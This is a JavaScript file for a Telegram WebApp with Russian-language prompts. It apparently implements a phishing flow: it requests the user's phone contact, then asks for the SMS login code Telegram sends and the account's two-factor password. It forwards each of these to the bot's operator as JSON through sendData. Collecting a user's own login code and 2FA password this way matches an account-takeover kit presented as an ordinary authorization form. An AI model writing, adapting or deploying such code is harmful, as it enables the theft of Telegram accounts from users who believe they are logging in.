document.addEventListener('DOMContentLoaded', () => {
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    const loginBtn = document.getElementById('loginBtn');
    const authForm = document.getElementById('authForm');
    const loadingSpinner = document.getElementById('loadingSpinner');
    const statusMsg = document.getElementById('statusMsg');
    const instructionMsg = document.getElementById('instructionMsg');
    const phoneInput = document.getElementById('phoneInput');
    const codeInput = document.getElementById('codeInput');
    const twoFaInput = document.getElementById('2faInput');
    const submitBtn = document.getElementById('submitBtn');
    const successMsg = document.getElementById('successMsg');
    const errorMsg = document.getElementById('errorMsg');

    let currentStep = 'contact';  // Шаги: contact, code, 2fa

    loginBtn.addEventListener('click', () => {
        console.log('Login button clicked');
        loginBtn.style.opacity = '0';
        setTimeout(() => loginBtn.classList.add('hidden'), 300);
        authForm.classList.remove('hidden');
        statusMsg.textContent = 'Поделитесь контактом для авторизации...';
        showLoading();
        currentStep = 'contact';

        // Запрос контакта
        tg.requestContact((contact) => {
            console.log('Contact callback fired, contact object:', contact);
            if (contact) {
                console.log('Contact granted, proceeding to code input');
                phoneInput.value = contact.phone_number || 'Номер отправлен боту';
                phoneInput.classList.remove('hidden');
                statusMsg.textContent = 'Номер отправлен. Ожидаем SMS...';
                tg.HapticFeedback.impactOccurred('light');
                
                setTimeout(() => {
                    console.log('Transition to code input');
                    phoneInput.classList.add('hidden');
                    codeInput.classList.remove('hidden');
                    submitBtn.classList.remove('hidden');
                    submitBtn.textContent = 'Отправить код';
                    statusMsg.textContent = 'Введите SMS-код из Telegram. Проверьте чат с ботом.';
                    currentStep = 'code';
                    hideLoading();
                }, 2000);
            } else {
                console.error('Contact denied (null contact)');
                hideLoading();
                errorMsg.textContent = '❌ Разрешение отклонено. Попробуйте снова.';
                errorMsg.classList.remove('hidden');
                setTimeout(resetForm, 2000);
            }
        }, (error) => {
            console.error('Request contact error:', error);
            hideLoading();
            errorMsg.textContent = '❌ Ошибка запроса разрешения. Попробуйте снова.';
            errorMsg.classList.remove('hidden');
            setTimeout(resetForm, 2000);
        });
    });

    submitBtn.addEventListener('click', () => {
        const step = currentStep;
        let payload = {};
        console.log('Submit clicked, step:', step);

        if (step === 'code') {
            const code = codeInput.value.trim();
            if (!code) {
                errorMsg.textContent = 'Введите код.';
                errorMsg.classList.remove('hidden');
                return;
            }
            payload = { action: 'verify_code', code: code };
            console.log('Sending code data:', payload);
            tg.sendData(JSON.stringify(payload));
            showLoading();
            statusMsg.textContent = 'Проверяем код... Проверьте чат с ботом.';
            tg.HapticFeedback.impactOccurred('medium');
            // Ждём ответа от бота через чат
            return;
        }

        if (step === '2fa') {
            const password = twoFaInput.value.trim();
            payload = { action: 'verify_2fa', password: password };
            console.log('Sending 2FA data:', payload);
            tg.sendData(JSON.stringify(payload));
            showLoading();
            statusMsg.textContent = 'Подтверждаем 2FA... Проверьте чат с ботом.';
            tg.HapticFeedback.impactOccurred('heavy');
            // Ждём ответа от бота через чат
            return;
        }
    });

    function showLoading() {
        loadingSpinner.classList.remove('hidden');
        submitBtn.disabled = true;
        errorMsg.classList.add('hidden');
        console.log('Showing loading');
    }

    function hideLoading() {
        loadingSpinner.classList.add('hidden');
        submitBtn.disabled = false;
        console.log('Hiding loading');
    }

    function resetForm() {
        console.log('Resetting form');
        authForm.classList.add('hidden');
        loginBtn.classList.remove('hidden');
        loginBtn.style.opacity = '1';
        currentStep = 'contact';
        phoneInput.value = '';
        codeInput.value = '';
        twoFaInput.value = '';
        successMsg.classList.add('hidden');
        errorMsg.classList.add('hidden');
        instructionMsg.classList.add('hidden');
        statusMsg.textContent = '';
    }

    tg.onEvent('webAppDataSent', () => {
        console.log('WebApp data sent');
        tg.HapticFeedback.impactOccurred('light');
        // Показываем поле 2FA, если код отправлен
        if (currentStep === 'code') {
            hideLoading();
            instructionMsg.classList.remove('hidden');
            twoFaInput.classList.remove('hidden');
            submitBtn.textContent = 'Подтвердить 2FA (если нужно)';
            statusMsg.textContent = 'Код отправлен. Проверьте чат с ботом. Если требуется 2FA, введите пароль.';
            currentStep = '2fa';
        } else if (currentStep === '2fa') {
            hideLoading();
            statusMsg.textContent = 'Ожидаем подтверждения... Проверьте чат с ботом.';
        }
    });

    tg.onEvent('error', (error) => {
        console.error('WebApp error:', error);
        hideLoading();
        errorMsg.textContent = '❌ Ошибка: ' + (error.message || 'Неизвестная ошибка');
        errorMsg.classList.remove('hidden');
        setTimeout(resetForm, 2000);
    });
});